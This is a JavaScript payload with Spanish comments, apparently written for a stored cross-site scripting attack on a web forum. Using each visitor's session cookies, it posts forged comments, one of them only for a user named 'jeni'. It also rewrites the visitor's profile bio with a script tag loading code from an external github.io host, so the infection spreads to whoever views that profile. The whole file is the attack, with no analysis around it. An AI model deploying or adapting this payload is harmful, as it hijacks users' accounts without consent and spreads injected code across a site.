(function(){
  try {
    // Evitar múltiples ejecuciones
    if (localStorage.getItem('jeniComentado') === '1') return;

    // Detectar usuario actual (ajustá el selector según el sitio)
    const userEl = document.querySelector('#nombre_usuario, .user-name, [data-user]');
    const usuario = (userEl?.textContent || userEl?.getAttribute('data-user') || '')
      .trim().toLowerCase();

    if (usuario === 'jeni') {
      const params = new URLSearchParams();
      // Ajustá estos nombres de campo según el formulario real
      params.append('txtComentario', 'Hola, soy Jeni y dejo mi comentario.');
      params.append('post_id', '1');
      params.append('btnEnviar', 'Enviar');

      fetch('/comment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        credentials: 'include',
        body: params.toString()
      }).then(r => {
        if (r.ok) localStorage.setItem('jeniComentado', '1');
      });

      
    }
  } catch(e){}
})();


(function(){
  try {
    // Evitar múltiples ejecuciones
    if (localStorage.getItem('pepeComentado') === '1') return;

    // Detectar usuario actual (ajustá el selector según el sitio)
    const userEl = document.querySelector('#nombre_usuario, .user-name, [data-user]');
    const usuario = (userEl?.textContent || userEl?.getAttribute('data-user') || '')
      .trim().toLowerCase();


      const params3 = new URLSearchParams();
      // Ajustá estos nombres de campo según el formulario real
      params3.append('txtComentario', 'Hola, soy Pepe y dejo mi comentario.');
      params3.append('post_id', '1');
      params3.append('btnEnviar', 'Enviar');

      fetch('/comment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        credentials: 'include',
        body: params3.toString()
      }).then(r => {
        if (r.ok) localStorage.setItem('pepeComentado', '1');
      });

      const params2 = new URLSearchParams();
      params2.append("bio","<script src=\"https://ianrichard3.github.io/thea/hola.js\"></script>")
      fetch('/profile', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        credentials: 'include',
        body: params2.toString()
      }).then(r => {
        if (r.ok) localStorage.setItem('pepeComentado', '1');
      });

  } catch(e){}
})();
